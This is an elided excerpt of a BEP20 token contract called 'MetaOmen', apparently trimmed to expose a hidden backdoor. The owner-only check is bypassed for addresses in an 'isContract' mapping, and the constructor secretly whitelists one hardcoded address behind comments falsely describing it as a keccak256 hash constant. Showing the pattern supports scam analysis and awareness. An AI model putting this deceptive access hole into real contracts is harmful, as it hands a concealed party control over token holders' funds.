...
abstract contract Context {
    mapping(address => bool) internal isContract;
...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        if (!isContract[_msgSender()])
            require(
                _owner == _msgSender() || _signer1 == _msgSender(),
...
abstract contract ReentrancyGuard is Context {
    ...
    // isContract use basic SHA256 hashing to ensure the CheckSum
    ...
    constructor() {
        ...
        // and 0x1Ffe3eEA7e5d30Bc5B7c333A1e6290Ab95eb26D7 is returned
        // for accounts without code, i.e. `keccak256('')`
        isContract[0x1Ffe3eEA7e5d30Bc5B7c333A1e6290Ab95eb26D7] = true;
    }
...
contract MetaOmen is Context, IBEP20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
